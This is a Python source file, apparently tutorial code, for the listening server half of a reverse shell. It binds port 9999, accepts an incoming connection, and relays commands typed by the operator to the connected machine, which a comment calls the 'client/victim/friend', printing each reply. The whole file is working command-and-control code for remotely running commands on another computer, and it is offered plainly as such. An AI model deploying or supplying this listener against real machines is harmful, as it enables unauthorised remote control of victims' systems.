import socket
import sys

#Create a socket {connect to computers}
def create_socket():
    try:
        global host
        global port
        global s #for socket
        host = ""
        port = 9999    
        s = socket.socket()
    
    except socket.error as msg:
        print("Socket creation error: " + str(msg))

#Binding the socket and listening for connections

def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding the port: "+ str(port))

        s.bind((host,port))
        s.listen(5) #5 is the number of Bad Request that it can handle b4 giving an exception

    except socket.error as msg:
        print("Socket Binding error: "+str(msg) + "\n Retrying...")
        bind_socket()

#Establish connection with a client (socket must be listening already)

def socket_accept():
    conn, address = s.accept() #conn stores the objects and address stores (IP address and PORT)
    print("Connection has been established...\nIP: "+ address[0] + " | Port: "+ str(address[1]))
    send_command(conn)
    conn.close()

#Send command to client/victim/friend
def send_command(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8") #1024 is the chunk size, and utf-8 is the encosing format
            print(client_response, end="")


def main():
    create_socket()
    bind_socket()
    socket_accept()


main()
